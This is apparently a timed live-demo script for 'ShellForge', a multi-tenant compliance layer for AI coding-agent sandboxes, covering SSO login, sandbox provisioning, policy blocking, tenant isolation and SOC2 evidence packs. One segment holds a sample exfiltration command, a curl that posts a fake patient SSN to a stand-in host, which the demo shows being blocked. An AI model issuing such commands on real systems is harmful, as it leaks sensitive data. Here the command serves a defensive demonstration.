# ShellForge Demo Script

**Duration:** 5 minutes  
**Format:** live browser demo + one terminal  
**Prereq:** `make demo` run and clean before entering the room

---

## :00–:30 — The Hook (30 seconds)

**Action:** Show NVIDIA OpenShell's GitHub README on screen. Scroll to the top header.  
**Point to:** "Alpha software — single-player mode. OpenShell is proof-of-life: one developer, one environment, one gateway."

**Say:**  
*"This is NVIDIA's AI agent sandbox. It's genuinely impressive — Landlock filesystem isolation, OPA network policy, credential injection. But read the fine print. Alpha. Single player. One developer, one environment. Every Betsol client that wants to deploy AI coding agents in production will need what NVIDIA isn't shipping yet."*

**[Transition]** Open ShellForge dashboard at `http://localhost:3000`

---

## :30–1:00 — SSO Login as acme-health Admin (30 seconds)

**Action:** Browser at `http://localhost:3000` (shows ShellForge login page, not dashboard yet)  
**Click:** "Sign in with SSO"  
**Dex login page loads.** Enter credentials:
```
Email: alice@acme-health.demo
Password: demo1234
```
**[Redirect → dashboard]**

**Point to (top right):** `Acme Health Systems` org chip + `Alice Chen, Org Admin` role badge

**Say:**  
*"Real OIDC, real SSO. This is Dex locally — in client prod, this connector points at their Okta or Azure AD. The org and role land in the JWT; every API call from here is scoped to acme-health. Not a mock."*

---

## 1:00–2:00 — Spawn Claude Code in HIPAA Sandbox (60 seconds)

**Action:** Click "New Sandbox" button (top right of Sandboxes page)  
**Modal opens.** Select:
- Template: `HIPAA — Healthcare AI Agent`
- Agent: `claude`
- Name: `live-demo-sandbox`

**Click "Provision"**

**Terminal (side):**
```bash
# show it's real
docker ps | grep openshell
```

**Dashboard shows:** sandbox status card with live progress:  
`Requesting sandbox...` → `Pulling image...` → `Starting sandbox...` → **`READY`** (green chip)

**Point to:** audit event that just appeared at bottom of audit feed: `sandbox.created — acme-health — alice — live-demo-sandbox`

**Say:**  
*"Real OpenShell sandbox. Real Docker container running behind it. The agent is live. Watch what happens when it tries to do something it shouldn't."*

---

## 2:00–3:00 — Trigger Policy Violation Live (60 seconds)

**Action:** In the sandbox detail view, click "Open Terminal" (connects via OpenShell relay SSH)  
**In terminal:**
```bash
curl -s https://evil-exfil.io/upload -d "patient_ssn=123-45-6789"
```

**Expected output:**
```
curl: (7) Failed to connect: 403 policy_denied
Endpoint evil-exfil.io:443 blocked by policy 'hipaa-healthcare-ai-agent'
```

**[Dashboard reacts — red alert banner slides in]**  
Policy Violation — "HTTP Activity blocked" — `acme-health` — `live-demo-sandbox` — destination: `evil-exfil.io:443`

**Click on the audit event row:**  
Shows full OCSF event:
```json
{
  "class_uid": 4002,
  "action": "Denied",
  "actor": { "user": { "uid": "alice", "email": "alice@acme-health.demo" } },
  "dst_endpoint": { "hostname": "evil-exfil.io", "port": 443 },
  "firewall_rule": { "name": "hipaa-healthcare-ai-agent", "desc": "HIPAA §164.312(a)(1)" },
  "event_hash": "a3f9c2d1...",
  "prev_hash": "8e7b1a04..."
}
```

**Point to hash chain:**  
*"Tamper-evident audit log. Each event hashes the previous one. You can't delete or edit an event without breaking the chain — and the chain break is detectable."*

---

## 3:00–3:45 — Tenant Switch to bolt-bank (45 seconds)

**Action:** Top right org switcher → select `Bolt Bank`  

**Dashboard reloads.** Show:
- Sandboxes: completely different list (bolt-bank sandboxes only)
- Policy: `PCI-DSS — Payment Card Processing`
- Audit feed: bolt-bank events only — **no acme-health events visible**

**Say:**  
*"Completely separate tenant. Different sandboxes, different policy (PCI this time), different audit trail. Acme-health data is nowhere in this view — not filtered out by the UI, not present in the database query. Postgres Row Level Security enforces it at the query layer."*

---

## 3:45–4:30 — Generate SOC2 Evidence Pack (45 seconds)

**Action:** Left nav → "Compliance" → "Generate Evidence Pack"  
**Modal:**
- Framework: `SOC 2 Type II`
- Period: last 24 hours
- Org: `Bolt Bank`

**Click "Generate PDF"**

**[10 seconds — progress bar]** → PDF downloads

**Open PDF.** Show:
- Cover: "Bolt Bank — SOC2 Type II Evidence Pack — [date range]"
- Section CC6.1: "Logical Access Controls" → lists sandbox creation events with timestamps and hashes
- Section CC6.6: "Transmission Security" → lists network policy enforcement events, TLS enforcement confirmed
- Section CC7.2: "Monitoring" → lists policy violation detections + resolution status

**Say:**  
*"This is what your compliance team hands to the SOC2 auditor. Controls mapped to actual events with timestamps and cryptographic proof of integrity. Generated from the live audit log."*

---

## 4:30–5:00 — The Close (30 seconds)

**Say:**  
*"JP showed how to spawn agents. That's the easy part — OpenShell does it. ShellForge is what makes those agents deployable in actual client production. Multi-tenancy, SSO, tamper-evident audit, compliance evidence. Everything the regulated enterprise needs and OpenShell doesn't ship."*

*(If testimonial exists)*  
*"We're already running this on [engagement X]."*

**[End]**

---

## Fallback Plan

| Scenario | Fallback |
|---|---|
| Sandbox doesn't provision in 60s | Show pre-provisioned sandbox `demo-sandbox-1` (already READY in seed data) |
| OIDC login fails | Pre-authenticated session already open in browser tab 2 |
| Policy violation doesn't surface in dashboard | Show pre-seeded violation event in audit feed; skip live terminal |
| PDF generation hangs | Open `deploy/seed/bolt-bank-soc2-demo.pdf` directly |
| Docker not running | Never reach this point — always confirm `make demo` succeeded before entering room |

**Rule:** Never apologize for using a fallback. Have it ready, execute smoothly, move on.
